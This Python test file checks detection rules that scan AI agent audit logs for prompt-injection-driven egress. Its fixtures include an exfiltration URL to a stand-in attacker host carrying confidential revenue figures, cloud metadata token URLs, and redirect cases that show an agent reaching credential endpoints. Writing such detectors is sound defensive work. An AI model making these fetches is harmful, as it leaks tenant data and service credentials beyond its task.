"""Tests for the M2 agent-audit detection rules (T9).

    python3 -m unittest discover -s detections -p 'test_*.py' -v

stdlib only, no stack. Every record below has the shape the two real
writers produce (gateway/audit.py, app/agent/audit.go), copied from a live
run's audit files with ids and tenant bytes replaced. The rules are pure
functions over those records; replay_agent.py feeds them real ones.
"""

from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import agent_rules as r  # noqa: E402

ALLOW = frozenset({"docs.example", "metadata.google.internal"})
TOKEN_URL = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
EXFIL_URL = "http://attacker.example/collect?data=Acme+Q3+revenue%3A+%244.2M"


def pre(did, session, tool, args, derived_from=(), *, route="unmediated", reasons=None, resolved=None):
    """A pre-record. route 'unmediated' = the agent's writer, else the gateway's."""
    rec = {
        "ts": "2026-11-09T18:04:34.784Z", "phase": "pre", "decision_id": did,
        "session": session, "acting_for": "u-1", "org": "o-1", "tool": tool,
        "args": args, "provenance": {"derived_from": list(derived_from)},
        "route": route, "reasons": reasons,
    }
    if route == "unmediated":
        rec["mediated"] = False
    if resolved:
        rec["resolved"] = resolved
    return rec


def post(did, summary, outcome="ok"):
    return {"ts": "2026-11-09T18:04:34.786Z", "phase": "post", "decision_id": did,
            "outcome": outcome, "summary": summary, "duration_ms": 1}


def fired(alerts):
    return sorted({a["rule"] for a in alerts})


class R1UntrustedFetch(unittest.TestCase):
    """The injection pattern, stated as a platform fact: a fetch whose
    context held content the platform labelled untrusted."""

    def test_a_fetch_derived_from_untrusted_content_fires(self):
        recs = [pre("a_1", "s1", "http_fetch", {"url": EXFIL_URL}, ["untrusted"])]
        self.assertIn("untrusted-fetch", fired(r.find_agent_alerts(recs, ALLOW)))

    def test_hardened_provenance_user_plus_untrusted_fires(self):
        recs = [pre("d_1", "s1", "http_fetch", {"url": EXFIL_URL}, ["user", "untrusted"],
                    route="deny", reasons=["egress_not_allowlisted"])]
        self.assertIn("untrusted-fetch", fired(r.find_agent_alerts(recs, ALLOW)))

    def test_a_fetch_the_user_asked_for_does_not(self):
        recs = [pre("d_1", "s1", "http_fetch", {"url": "http://docs.example/a"}, ["user"],
                    route="deny", reasons=["enrichment_failed"])]
        self.assertEqual(r.find_agent_alerts(recs, ALLOW), [])

    def test_reading_untrusted_content_is_not_egress(self):
        # The clean control reads a document; reading is not the incident.
        recs = [pre("a_1", "s1", "read_document", {"id": "doc-1"}, ["untrusted"]),
                post("a_1", "Acme Corp — confidential Q3 plan (113 bytes)")]
        self.assertEqual(r.find_agent_alerts(recs, ALLOW), [])


class R2EgressOffAllowlist(unittest.TestCase):
    def test_a_host_off_the_allowlist_fires(self):
        recs = [pre("a_1", "s1", "http_fetch", {"url": EXFIL_URL})]
        self.assertEqual(fired(r.find_agent_alerts(recs, ALLOW)), ["egress-off-allowlist"])

    def test_an_allowlisted_host_does_not(self):
        recs = [pre("a_1", "s1", "http_fetch", {"url": "http://docs.example/handbook"})]
        self.assertEqual(r.find_agent_alerts(recs, ALLOW), [])

    def test_host_matching_is_by_parsed_host_not_substring(self):
        # The policy matches the host exactly (policy.rego, leg 2). A
        # substring test would admit docs.example.attacker.example.
        for url in ("http://DOCS.EXAMPLE/x", "http://docs.example:8080/x"):
            with self.subTest(url=url):
                recs = [pre("a_1", "s1", "http_fetch", {"url": url})]
                self.assertEqual(r.find_agent_alerts(recs, ALLOW), [])
        for url in ("http://docs.example.attacker.example/x", "http://attacker.example/?h=docs.example"):
            with self.subTest(url=url):
                recs = [pre("a_1", "s1", "http_fetch", {"url": url})]
                self.assertEqual(fired(r.find_agent_alerts(recs, ALLOW)), ["egress-off-allowlist"])

    def test_a_fetch_with_no_parseable_host_fires(self):
        # Not on the allowlist is not on the allowlist -- a garbled URL is
        # not a reason to stay silent.
        for args in ({"url": "not a url"}, {}):
            with self.subTest(args=args):
                recs = [pre("a_1", "s1", "http_fetch", args)]
                self.assertEqual(fired(r.find_agent_alerts(recs, ALLOW)), ["egress-off-allowlist"])


class R3MetadataEndpoint(unittest.TestCase):
    def test_the_metadata_host_fires_although_it_is_allowlisted(self):
        # D6 put the metadata host ON the allowlist, so R2 is blind to
        # finding 04 by design. R3 does not consult the allowlist.
        recs = [pre("a_1", "s1", "http_fetch", {"url": TOKEN_URL})]
        self.assertEqual(fired(r.find_agent_alerts(recs, ALLOW)), ["metadata-endpoint"])

    def test_the_link_local_address_fires_by_url_or_resolution(self):
        cases = [
            pre("a_1", "s1", "http_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}),
            pre("d_1", "s1", "http_fetch", {"url": "http://docs.example/x"}, ["user"], route="deny",
                reasons=["resolved_address_denied"],
                resolved={"host": "docs.example", "ip": "169.254.169.254", "denied_range": True}),
            pre("a_1", "s1", "http_fetch", {"url": "http://[fd00:ec2::254]/latest/"}),
        ]
        for rec in cases:
            with self.subTest(url=rec["args"]["url"]):
                self.assertIn("metadata-endpoint", fired(r.find_agent_alerts([rec], ALLOW)))

    def test_the_lab_s_own_fixture_ip_is_not_a_metadata_signature(self):
        # In this lab metadata.google.internal resolves to 172.28.0.20. A
        # rule keyed on that would detect the lab, not the attack.
        rec = pre("d_1", "s1", "http_fetch", {"url": "http://docs.example/x"}, ["user"], route="deny",
                  reasons=["resolved_address_denied"],
                  resolved={"host": "docs.example", "ip": "172.28.0.20", "denied_range": True})
        self.assertEqual(r.find_agent_alerts([rec], ALLOW), [])

    def test_a_redirect_to_the_metadata_host_fires_via_the_post_record(self):
        # Finding 04's redirect variant: the request names only the
        # attacker's redirector; the metadata host appears ONLY in the
        # completion record's final URL. This is the real format,
        # app/agent/executor_vulnerable.go: "%s -> %d (%d bytes)".
        recs = [pre("a_1", "s1", "http_fetch", {"url": "http://attacker.example/redirect"}),
                post("a_1", f"{TOKEN_URL} -> 200 (113 bytes)")]
        alerts = r.find_agent_alerts(recs, ALLOW)
        self.assertEqual(fired(alerts), ["egress-off-allowlist", "metadata-endpoint"])
        # The alert names the hop, not just the host asked for: an operator
        # reading "attacker.example" alone would not know the credential
        # endpoint was reached (found on the first live replay).
        meta = next(a for a in alerts if a["rule"] == "metadata-endpoint")
        self.assertEqual(meta["hosts"], ["attacker.example -> metadata.google.internal"])

    def test_the_summary_format_is_the_vulnerable_fetcher_s(self):
        # R3's redirect leg parses a summary the Go fetcher formats. Read
        # the format string from the Go source rather than trusting a
        # hand-copied example: a reworded Sprintf fails HERE, not only in
        # a live vulnerable 04-redirect cell (T9 review).
        go = (r.REPO / "app" / "agent" / "executor_vulnerable.go").read_text(encoding="utf-8")
        self.assertIn('Summary: fmt.Sprintf("%s -> %d (%d bytes)", final,', go)
        sample = "%s -> %d (%d bytes)" % ("http://h/x", 200, 113)
        self.assertRegex(sample, r.FINAL_URL)

    def test_a_post_record_is_joined_by_id_not_by_position(self):
        recs = [pre("a_1", "s1", "http_fetch", {"url": "http://attacker.example/redirect"}),
                pre("a_2", "s2", "http_fetch", {"url": "http://attacker.example/redirect"}),
                post("a_2", f"{TOKEN_URL} -> 200 (113 bytes)"),
                post("a_1", "http://attacker.example/landing -> 200 (5 bytes)")]
        alerts = [a for a in r.find_agent_alerts(recs, ALLOW) if a["rule"] == "metadata-endpoint"]
        self.assertEqual([a["session"] for a in alerts], ["s2"])

    def test_failed_or_unparseable_completions_are_not_redirects(self):
        recs = [pre("a_1", "s1", "http_fetch", {"url": "http://attacker.example/redirect"}),
                post("a_1", "", outcome="error"),
                post("a_9", f"{TOKEN_URL} -> 200 (1 bytes)")]   # no pre in this window
        self.assertEqual(fired(r.find_agent_alerts(recs, ALLOW)), ["egress-off-allowlist"])


class AlertShape(unittest.TestCase):
    def test_one_alert_per_rule_per_session_with_a_count(self):
        recs = [pre("a_1", "s1", "http_fetch", {"url": EXFIL_URL}),
                pre("a_2", "s1", "http_fetch", {"url": "http://evil.example/x"}),
                pre("a_3", "s2", "http_fetch", {"url": EXFIL_URL})]
        alerts = sorted(r.find_agent_alerts(recs, ALLOW), key=lambda a: a["session"])
        self.assertEqual([(a["session"], a["count"]) for a in alerts], [("s1", 2), ("s2", 1)])
        self.assertEqual(alerts[0]["hosts"], ["attacker.example", "evil.example"])
        self.assertEqual(alerts[0]["decision_ids"], ["a_1", "a_2"])

    def test_an_alert_never_carries_the_url(self):
        # The exfil URL's query string IS the stolen tenant data; an alert
        # printed into a CI log must not re-leak it.
        recs = [pre("a_1", "s1", "http_fetch", {"url": EXFIL_URL}, ["untrusted"])]
        for alert in r.find_agent_alerts(recs, ALLOW):
            self.assertNotIn("data=", json.dumps(alert))
            self.assertNotIn("4.2M", json.dumps(alert))

    def test_no_records_no_alerts(self):
        self.assertEqual(r.find_agent_alerts([], ALLOW), [])


class DenyOnlyBaseline(unittest.TestCase):
    """What an M1-style detector -- alert on the gate's denials -- sees."""

    def test_it_sees_gateway_denials(self):
        recs = [pre("d_1", "s1", "http_fetch", {"url": EXFIL_URL}, ["user", "untrusted"],
                    route="deny", reasons=["egress_not_allowlisted"])]
        self.assertEqual([a["session"] for a in r.deny_only_alerts(recs)], ["s1"])

    def test_it_is_blind_to_the_agent_s_unmediated_calls(self):
        # The vulnerable mode's exfiltration: nothing was denied, so a
        # denial-based detector sees nothing -- M1's measured coupling.
        recs = [pre("a_1", "s1", "http_fetch", {"url": EXFIL_URL}, ["untrusted"]),
                post("a_1", "http://attacker.example/collect -> 200 (2 bytes)")]
        self.assertEqual(r.deny_only_alerts(recs), [])

    def test_allowed_calls_are_not_denials(self):
        recs = [pre("d_1", "s1", "read_document", {"id": "x"}, ["user"],
                    route="allow", reasons=["policy_satisfied"])]
        self.assertEqual(r.deny_only_alerts(recs), [])


class Inputs(unittest.TestCase):
    def test_jsonl_is_parsed_line_by_line(self):
        text = json.dumps(post("a_1", "x")) + "\n\n" + json.dumps(post("a_2", "y")) + "\n"
        self.assertEqual([x["decision_id"] for x in r.parse_jsonl(text)], ["a_1", "a_2"])

    def test_a_malformed_line_is_an_error_not_a_skipped_record(self):
        # A detector that silently skips what it cannot read reports
        # "nothing found" about records it never looked at.
        with self.assertRaises(ValueError):
            r.parse_jsonl('{"phase":"pre"}\n{not json\n')

    def test_the_allowlist_is_the_policy_s_own(self):
        # One source (T9 D2): the detector reads the same file the gate does.
        allow = r.load_allowlist(r.POLICY_DATA)
        self.assertIn("docs.example", allow)
        self.assertNotIn("attacker.example", allow)

    def test_the_shipped_allowlist_admits_the_metadata_host(self):
        # Pins the D6 fact R3 exists for. If this ever fails, the policy
        # changed and R3's reason to be allowlist-independent should be
        # re-read, not this test deleted.
        self.assertIn("metadata.google.internal", r.load_allowlist(r.POLICY_DATA))

    def test_an_unreadable_allowlist_is_an_error(self):
        with self.assertRaises((OSError, ValueError, KeyError)):
            r.load_allowlist(HERE / "no-such-file.json")


if __name__ == "__main__":
    unittest.main()
